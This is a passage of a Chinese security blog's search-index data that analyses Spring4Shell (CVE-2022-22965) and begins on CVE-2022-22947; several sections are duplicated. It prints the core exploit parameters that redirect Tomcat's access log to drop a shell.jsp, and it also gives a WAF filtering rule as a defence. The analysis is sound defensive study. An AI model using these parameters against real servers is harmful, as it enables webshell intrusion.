漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#源码分析详解"},{"categories":[],"content":"\rJavaBean 内省\r基本概念内省 (IntroSpector): 计算机程序在运行时 (Runtime) 检查对象 (Object) 类型的一种能力，通常也可以称作运行时类型检查 Java 官方对 JavaBean 内省的定义 At runtime and in the builder environment we need to be able to figure out which properties, events, and methods a Java Bean supports. We call this process introspection. 从 Java Bean 的角度来看，这里的对象就是 Bean 对象，主要关注点是属性、方法和事件等，也就是说在运行时可以获取相应的信息进行一些处理，这就是 JavaBean 的内省机制。 上述描述和反射很接近，反射是获取一个对象所属的类，并通过 Class 调用类内的属性和方法，和内省机制很接近。 和反射的区别首先明确，内省其实就是对反射的封装 By default we will use a low level reflection mechanism to study the methods supported by a target bean and then apply simple design patterns to deduce from those methods what properties, events, and public methods are supported. 反射：在运行状态把 Java 类中的各种成分映射成相应的 Java 类 (Method, Class 等），可以动态的获取所有的属性以及动态调用任意一个方法，强调的是运行状态 内省：Java 语言针对 Bean 类属性、事件的一种缺省处理方法，并且内省机制是通过反射来实现的。返回的 BeanInfo 用来暴露一个 Bean 的属性、方法和事件，以后我们就可以操纵该 JavaBean 的属性 源码分析详解\rPropertyDescriptor属性描述符，该类实现了对 JavaBean 的某一属性的所有描述 主要方法包括： getPropertyType()，获得属性的 Class 对象； getReadMethod()，获得用于读取属性值的方法； getWriteMethod()，获得用于写入属性值的方法； hashCode()，获取对象的哈希值； setReadMethod(Method readMethod)，设置用于读取属性值的方法； setWriteMethod(Method writeMethod)，设置用于写入属性值的方法。 java public class User { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + '}'; } } public static void main (String[] args) throws Exception { // 创建并输出 User 对象的值 User user = new User(); System.out.println( user.toString ); // 创建一个 User.name 的属性描述符 PropertyDescriptor propertyDescriptor = new PropertyDescriptor( \"name\", User.class ); // 获得并调用 User.name 的读方法，也就是 getter --\u003e User.getname() Method readMethod = propertyDescriptor.getReadMethod(); System.out.println( readMethod.invoke( user ) ); // 获得并调用 User.name 的写方法，也就是 setter --\u003e User.setname() Method writeMethod = propertyDescriptor.getWriteMethod(); writeMethod.invoke( user, \"hello\" ); System.out.println( user.toString ); }\rtext 输出结果： User{name='null', aName='null'} null User{name='hello', aName='null'}\r通过上述的例子，可以看出 PropertyDescriptor, 就是对属性反射的一种封装，方便操作对应 JavaBean 的属性，使用 PropertyDescriptor 其实就是利用反射对其 get 和 set 方法的操作而已。 BeanInfoBeanInfo 是一个接口，其常用的实现是 GenericBeanInfo java class GenericBeanInfo extends SimpleBeanInfo { // JavaBean 的描述符，持有类 Class 对象的引用 private BeanDescriptor beanDescriptor; // JavaBean 的所有属性描述符 private PropertyDescriptor[] properties; // JavaBean 的所有方法描述符 private MethodDescriptor[] methods; ... }\rBeanInfo 就是对一个 JavaBean 类所有的属性、方法等反射操作封装后的集合体。 IntroSpector介绍完了内省所需要的所有前置知识，最后说回最开始的内省机制。 Java 中提供了一套 API 用来访问某个属性的 getter/setter 方法。 Introspector, 提供了 getBeanInfo 方法，可以拿到一个 JavaBean 的所有信息 BeanInfo, 提供了 getPropertyDescriptors 方法和 getMethodDescriptors 方法可以拿到 javaBean 的字段信息列表和 getter 和 setter 方法信息列表 PropertyDescriptors 可以根据字段直接获得该字段的 getter 和 setter 方法 MethodDescriptors 可以获得方法的元信息，比如方法名，参数个数，参数字段类型等 通过 Introspector 获取一个类的 BeanInfo, 通过 BeanInfo 能够获取属性描述器、方法描述器、类 Class 对象，利用获取到的属性描述器，我们能够往一个该类实例中放入数据 java public static void main(String[] args) throws Exception { BeanInfo beanInfo = Introspector.getBeanInfo( Customer.class ); PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors(); MethodDescriptor[] methodDescriptors = beanInfo.getMethodDescriptors(); BeanDescriptor beanDescriptor = beanInfo.getBeanDescriptor(); }\r","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#propertydescriptor"},{"categories":[],"content":"\rJavaBean 内省\r基本概念内省 (IntroSpector): 计算机程序在运行时 (Runtime) 检查对象 (Object) 类型的一种能力，通常也可以称作运行时类型检查 Java 官方对 JavaBean 内省的定义 At runtime and in the builder environment we need to be able to figure out which properties, events, and methods a Java Bean supports. We call this process introspection. 从 Java Bean 的角度来看，这里的对象就是 Bean 对象，主要关注点是属性、方法和事件等，也就是说在运行时可以获取相应的信息进行一些处理，这就是 JavaBean 的内省机制。 上述描述和反射很接近，反射是获取一个对象所属的类，并通过 Class 调用类内的属性和方法，和内省机制很接近。 和反射的区别首先明确，内省其实就是对反射的封装 By default we will use a low level reflection mechanism to study the methods supported by a target bean and then apply simple design patterns to deduce from those methods what properties, events, and public methods are supported. 反射：在运行状态把 Java 类中的各种成分映射成相应的 Java 类 (Method, Class 等），可以动态的获取所有的属性以及动态调用任意一个方法，强调的是运行状态 内省：Java 语言针对 Bean 类属性、事件的一种缺省处理方法，并且内省机制是通过反射来实现的。返回的 BeanInfo 用来暴露一个 Bean 的属性、方法和事件，以后我们就可以操纵该 JavaBean 的属性 源码分析详解\rPropertyDescriptor属性描述符，该类实现了对 JavaBean 的某一属性的所有描述 主要方法包括： getPropertyType()，获得属性的 Class 对象； getReadMethod()，获得用于读取属性值的方法； getWriteMethod()，获得用于写入属性值的方法； hashCode()，获取对象的哈希值； setReadMethod(Method readMethod)，设置用于读取属性值的方法； setWriteMethod(Method writeMethod)，设置用于写入属性值的方法。 java public class User { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + '}'; } } public static void main (String[] args) throws Exception { // 创建并输出 User 对象的值 User user = new User(); System.out.println( user.toString ); // 创建一个 User.name 的属性描述符 PropertyDescriptor propertyDescriptor = new PropertyDescriptor( \"name\", User.class ); // 获得并调用 User.name 的读方法，也就是 getter --\u003e User.getname() Method readMethod = propertyDescriptor.getReadMethod(); System.out.println( readMethod.invoke( user ) ); // 获得并调用 User.name 的写方法，也就是 setter --\u003e User.setname() Method writeMethod = propertyDescriptor.getWriteMethod(); writeMethod.invoke( user, \"hello\" ); System.out.println( user.toString ); }\rtext 输出结果： User{name='null', aName='null'} null User{name='hello', aName='null'}\r通过上述的例子，可以看出 PropertyDescriptor, 就是对属性反射的一种封装，方便操作对应 JavaBean 的属性，使用 PropertyDescriptor 其实就是利用反射对其 get 和 set 方法的操作而已。 BeanInfoBeanInfo 是一个接口，其常用的实现是 GenericBeanInfo java class GenericBeanInfo extends SimpleBeanInfo { // JavaBean 的描述符，持有类 Class 对象的引用 private BeanDescriptor beanDescriptor; // JavaBean 的所有属性描述符 private PropertyDescriptor[] properties; // JavaBean 的所有方法描述符 private MethodDescriptor[] methods; ... }\rBeanInfo 就是对一个 JavaBean 类所有的属性、方法等反射操作封装后的集合体。 IntroSpector介绍完了内省所需要的所有前置知识，最后说回最开始的内省机制。 Java 中提供了一套 API 用来访问某个属性的 getter/setter 方法。 Introspector, 提供了 getBeanInfo 方法，可以拿到一个 JavaBean 的所有信息 BeanInfo, 提供了 getPropertyDescriptors 方法和 getMethodDescriptors 方法可以拿到 javaBean 的字段信息列表和 getter 和 setter 方法信息列表 PropertyDescriptors 可以根据字段直接获得该字段的 getter 和 setter 方法 MethodDescriptors 可以获得方法的元信息，比如方法名，参数个数，参数字段类型等 通过 Introspector 获取一个类的 BeanInfo, 通过 BeanInfo 能够获取属性描述器、方法描述器、类 Class 对象，利用获取到的属性描述器，我们能够往一个该类实例中放入数据 java public static void main(String[] args) throws Exception { BeanInfo beanInfo = Introspector.getBeanInfo( Customer.class ); PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors(); MethodDescriptor[] methodDescriptors = beanInfo.getMethodDescriptors(); BeanDescriptor beanDescriptor = beanInfo.getBeanDescriptor(); }\r","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#beaninfo"},{"categories":[],"content":"\rJavaBean 内省\r基本概念内省 (IntroSpector): 计算机程序在运行时 (Runtime) 检查对象 (Object) 类型的一种能力，通常也可以称作运行时类型检查 Java 官方对 JavaBean 内省的定义 At runtime and in the builder environment we need to be able to figure out which properties, events, and methods a Java Bean supports. We call this process introspection. 从 Java Bean 的角度来看，这里的对象就是 Bean 对象，主要关注点是属性、方法和事件等，也就是说在运行时可以获取相应的信息进行一些处理，这就是 JavaBean 的内省机制。 上述描述和反射很接近，反射是获取一个对象所属的类，并通过 Class 调用类内的属性和方法，和内省机制很接近。 和反射的区别首先明确，内省其实就是对反射的封装 By default we will use a low level reflection mechanism to study the methods supported by a target bean and then apply simple design patterns to deduce from those methods what properties, events, and public methods are supported. 反射：在运行状态把 Java 类中的各种成分映射成相应的 Java 类 (Method, Class 等），可以动态的获取所有的属性以及动态调用任意一个方法，强调的是运行状态 内省：Java 语言针对 Bean 类属性、事件的一种缺省处理方法，并且内省机制是通过反射来实现的。返回的 BeanInfo 用来暴露一个 Bean 的属性、方法和事件，以后我们就可以操纵该 JavaBean 的属性 源码分析详解\rPropertyDescriptor属性描述符，该类实现了对 JavaBean 的某一属性的所有描述 主要方法包括： getPropertyType()，获得属性的 Class 对象； getReadMethod()，获得用于读取属性值的方法； getWriteMethod()，获得用于写入属性值的方法； hashCode()，获取对象的哈希值； setReadMethod(Method readMethod)，设置用于读取属性值的方法； setWriteMethod(Method writeMethod)，设置用于写入属性值的方法。 java public class User { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + '}'; } } public static void main (String[] args) throws Exception { // 创建并输出 User 对象的值 User user = new User(); System.out.println( user.toString ); // 创建一个 User.name 的属性描述符 PropertyDescriptor propertyDescriptor = new PropertyDescriptor( \"name\", User.class ); // 获得并调用 User.name 的读方法，也就是 getter --\u003e User.getname() Method readMethod = propertyDescriptor.getReadMethod(); System.out.println( readMethod.invoke( user ) ); // 获得并调用 User.name 的写方法，也就是 setter --\u003e User.setname() Method writeMethod = propertyDescriptor.getWriteMethod(); writeMethod.invoke( user, \"hello\" ); System.out.println( user.toString ); }\rtext 输出结果： User{name='null', aName='null'} null User{name='hello', aName='null'}\r通过上述的例子，可以看出 PropertyDescriptor, 就是对属性反射的一种封装，方便操作对应 JavaBean 的属性，使用 PropertyDescriptor 其实就是利用反射对其 get 和 set 方法的操作而已。 BeanInfoBeanInfo 是一个接口，其常用的实现是 GenericBeanInfo java class GenericBeanInfo extends SimpleBeanInfo { // JavaBean 的描述符，持有类 Class 对象的引用 private BeanDescriptor beanDescriptor; // JavaBean 的所有属性描述符 private PropertyDescriptor[] properties; // JavaBean 的所有方法描述符 private MethodDescriptor[] methods; ... }\rBeanInfo 就是对一个 JavaBean 类所有的属性、方法等反射操作封装后的集合体。 IntroSpector介绍完了内省所需要的所有前置知识，最后说回最开始的内省机制。 Java 中提供了一套 API 用来访问某个属性的 getter/setter 方法。 Introspector, 提供了 getBeanInfo 方法，可以拿到一个 JavaBean 的所有信息 BeanInfo, 提供了 getPropertyDescriptors 方法和 getMethodDescriptors 方法可以拿到 javaBean 的字段信息列表和 getter 和 setter 方法信息列表 PropertyDescriptors 可以根据字段直接获得该字段的 getter 和 setter 方法 MethodDescriptors 可以获得方法的元信息，比如方法名，参数个数，参数字段类型等 通过 Introspector 获取一个类的 BeanInfo, 通过 BeanInfo 能够获取属性描述器、方法描述器、类 Class 对象，利用获取到的属性描述器，我们能够往一个该类实例中放入数据 java public static void main(String[] args) throws Exception { BeanInfo beanInfo = Introspector.getBeanInfo( Customer.class ); PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors(); MethodDescriptor[] methodDescriptors = beanInfo.getMethodDescriptors(); BeanDescriptor beanDescriptor = beanInfo.getBeanDescriptor(); }\r","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#introspector"},{"categories":[],"content":"\rSpring CachedIntrospectionResults\rjava public final class CachedIntrospectionResults { /** * Map keyed by Class containing CachedIntrospectionResults, strongly held. * This variant is being used for cache-safe bean classes. */ static final ConcurrentMap\u003cClass\u003c?\u003e, CachedIntrospectionResults\u003e strongClassCache = new ConcurrentHashMap\u003c\u003e(64); /** * Map keyed by Class containing CachedIntrospectionResults, softly held. * This variant is being used for non-cache-safe bean classes. */ static final ConcurrentMap\u003cClass\u003c?\u003e, CachedIntrospectionResults\u003e softClassCache = new ConcurrentReferenceHashMap\u003c\u003e(64); static CachedIntrospectionResults forClass(Class\u003c?\u003e beanClass) throws BeansException { // 尝试在 strongClassCache 中获得 CachedIntrospectionResults results = strongClassCache.get(beanClass); if (results != null) { return results; } // 获取不到的话在 softClassCache 中获取 results = softClassCache.get(beanClass); if (results != null) { return results; } // 如果都没有获得 创建对象进行获取 results = new CachedIntrospectionResults(beanClass); ConcurrentMap\u003cClass\u003c?\u003e, CachedIntrospectionResults\u003e classCacheToUse; if (ClassUtils.isCacheSafe(beanClass, CachedIntrospectionResults.class.getClassLoader()) || isClassLoaderAccepted(beanClass.getClassLoader())) { classCacheToUse = strongClassCache; } else { if (logger.isDebugEnabled()) { logger.debug(\"Not strongly caching class [\" + beanClass.getName() + \"] because it is not cache-safe\"); } classCacheToUse = softClassCache; } // 缓存获得的结果 CachedIntrospectionResults existing = classCacheToUse.putIfAbsent(beanClass, results); return (existing != null ? existing : results); } }\rCachedIntrospectionResults这个类是 Spring 提供的对类的内省机制使用的工具类，不同于Introspector之处在于，该类提供类内省机制时的数据缓存，即内省获得的PropertyDescriptor这些数据进行了缓存，之后通过全局变量 Map 提供了对内省机制获得的BeanInfo信息的缓存，从而可以方便通过 static 方法获取对应类的内省信息。 ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:3","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#spring-cachedintrospectionresults"},{"categories":[],"content":"\rspring 参数绑定在 springMVC 中，接收页面提交的数据是通过方法形参来接收的。从客户端请求的 key/value 数据，经过参数绑定，将 key/value 数据绑定到 controller 方法的形参上，然后就可以在 controller 中使用该参数了。 eg: JavaBean java package top.dre4merp; public class User { private String name; private Integer age; public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } }\rController java package top.dre4merp; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.ResponseBody; @Controller public class TestController { @RequestMapping(path = \"/test\") @ResponseBody public String Test(User u){ return u.toString(); } }\r结果 ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:4","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#spring-参数绑定"},{"categories":[],"content":"\r漏洞分析","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:0","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞分析"},{"categories":[],"content":"\r漏洞点分析Spring4Shell 的漏洞点就在对参数进行赋值的过程中 在org.springframework.beans.AbstractPropertyAccessor#setPropertyValues(org.springframework.beans.PropertyValues, boolean, boolean)这个函数中获取用户输入的参数并对 bean 对象进行赋值 在赋值的过程中需要获取到对应的参数对象的参数描述符，其中的getCachedIntrospectionResults().getPropertyDescriptor(propertyName)函数便是通过名字在前文提到的缓存中获取参数描述符 如上图，取到了缓存的top.dre4merp.User的属性描述符，其中包含了三个属性，其中的name和age没有任何问题，但是其中的class并不是我们设置的 查看一下class的具体属性值，可以看出其是一个指向top.dre4merp.User的java.lang.Class, 通过这个属性描述符可以进行反射调用。那这个class是从哪里来的呢，这就需要我们回到第一次缓存的时候查看。 下图中，红框以下的部分之前已经分析过，包括forClass。红框中的部分就是 spring 调用 java 本身的内省，也就是IntroSpector获得 BeanInfo 上图中出现了递归调用是因为IntroSpector会获取父类的 BeanInfo 之后在获得子类的 BeanInfo 时，会先将父类的PropertyDescriptor添加到子类的PropertyDescriptors中，所以理论上所有继承自Object的类都会获得class属性 ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:1","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞点分析"},{"categories":[],"content":"\r利用分析利用这个漏洞进行 RCE 的本质其实是对 tomcat 的配置进行覆盖修改，修改 tomcat 的日志位置到根目录，修改日志的后缀为 jsp，即上传了一个 shell.jsp。 以下为 POC 中关键的信息： pattern 为生成的 shell.jsp 中的内容 suffix 为日志文件后缀名 directory 为日志文件 (jsp) 放置的路径 prefix 为日志文件前缀名 fileDateFormat 为日志文件的输出格式 java class.module.classLoader.resources.context.parent.pipeline.first.pattern= \u0026class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp \u0026class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT \u0026class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell \u0026class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\r在org.springframework.beans#getPropertyAccessorForPropertyPath(String)中递归寻找对应的属性访问器 最后在org.springframework.beans#setPropertyValue(PropertyValue)中设置由用户控制的值 ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:2","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#利用分析"},{"categories":[],"content":"\r利用条件 中间件为 Tomcat 目前传出的 POC 中，均为利用 Tomcat 的日志进行 shell 的上传 打包为 WAR 并部署在独立的 Tomcat 实例中；使用嵌入式 Servlet 容器或 Spring Boot 部署不受影响 Tomcat 有 spring-webmvc 或 spring-webflux 依赖 jdk 版本 \u003e= 9 如下图，当初 Spring 修复了 CVE-2010-1622，修复方式是拦截 Class.getClassLoader 的访问。但是 Java9 新增了可以通过Class.getModule方法。通过getModule的结果可以调用getClassloader的方式继续访问更多对象的属性。 ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:3","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#利用条件"},{"categories":[],"content":"\r漏洞防护","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:4:0","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞防护"},{"categories":[],"content":"\r官方修复建议更新至最新版本。 ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:4:1","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#官方修复建议"},{"categories":[],"content":"\r临时防护方案在WAF等网络防护设备上，根据实际部署业务的流量情况，实现对\"class.*\",“Class.*”,\".class.*\",\"*.Class.*“等字符串的规则过滤，并在部署过滤规则后，对业务运行情况进行测试，避免产生额外影响 ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:4:2","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#临时防护方案"},{"categories":[],"content":"\r参考https://juejin.cn/post/6844904177156489229 https://xiaomi-info.github.io/2020/03/16/java-beans-introspection/ https://jasonkayzk.github.io/2020/03/02/Java%E7%9A%84%E5%86%85%E7%9C%81%E6%8A%80%E6%9C%AF/ https://www.microsoft.com/security/blog/2022/04/04/springshell-rce-vulnerability-guidance-for-protecting-against-and-detecting-cve-2022-22965/ ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:5:0","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#参考"},{"categories":[],"content":"\r背景","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:1:0","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#背景"},{"categories":[],"content":"\r前置知识","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:0","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#前置知识"},{"categories":[],"content":"\rAPI网关在微服务架构中，由于一个系统由多个服务组成，客户端不再直接请求服务，而是添加了API网关的概念。客户端直接向API网关发起请求，由API网关对请求进行处理，并分发给不同的服务。 具体区别如下图： ","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:1","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#api网关"},{"categories":[],"content":"\rSpring Cloud Gateway\r概念Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件。 Spring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。 核心概念 描述 Route（路由） 网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。 Predicate（断言） 路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。 Filter（过滤器） 过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对响应进行再处理。 Actuator API官方文档： https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api 暴露网关通过/gateway这个Actuator可以监控并且和网关进行交互，前提是将该endpoint暴露给Web 通过配置application.properties允许web访问api properties management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r网关允许的操作网关支持的所有操作如下图，我们可以看到其支持通过POST请求添加一个新的route 添加路由官网给出的例子如下，可以创建一个简单的Route 添加过滤器上面的路由中最关键的过滤器为空，官方提过了多种自定义过滤器 https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#the-rewritepath-gatewayfilter-factory 以RewritePath为例: 发送如下两个请求就可以添加一个路由器，并将http://127.0.0.1:9000/red重定向为https://blog.dre4merp.top/ text POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Type: application/json Content-Length: 346 { \"predicates\": [ { \"name\": \"Path\", \"args\": { \"_genkey_0\": \"/red/**\" } } ], \"filters\": [ { \"name\": \"RewritePath\", \"args\": { \"_genkey_0\": \"/red/?(?\u003cpath\u003e.*)\", \"_genkey_1\": \"/${path}\" } } ], \"uri\": \"http://blog.dre4merp.top\", \"order\": 0 }\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Length: 2\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#spring-cloud-gateway"},{"categories":[],"content":"\rSpring Cloud Gateway\r概念Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件。 Spring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。 核心概念 描述 Route（路由） 网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。 Predicate（断言） 路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。 Filter（过滤器） 过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对响应进行再处理。 Actuator API官方文档： https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api 暴露网关通过/gateway这个Actuator可以监控并且和网关进行交互，前提是将该endpoint暴露给Web 通过配置application.properties允许web访问api properties management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r网关允许的操作网关支持的所有操作如下图，我们可以看到其支持通过POST请求添加一个新的route 添加路由官网给出的例子如下，可以创建一个简单的Route 添加过滤器上面的路由中最关键的过滤器为空，官方提过了多种自定义过滤器 https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#the-rewritepath-gatewayfilter-factory 以RewritePath为例: 发送如下两个请求就可以添加一个路由器，并将http://127.0.0.1:9000/red重定向为https://blog.dre4merp.top/ text POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Type: application/json Content-Length: 346 { \"predicates\": [ { \"name\": \"Path\", \"args\": { \"_genkey_0\": \"/red/**\" } } ], \"filters\": [ { \"name\": \"RewritePath\", \"args\": { \"_genkey_0\": \"/red/?(?.*)\", \"_genkey_1\": \"/${path}\" } } ], \"uri\": \"http://blog.dre4merp.top\", \"order\": 0 }\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Length: 2\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#概念"},{"categories":[],"content":"\rSpring Cloud Gateway\r概念Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 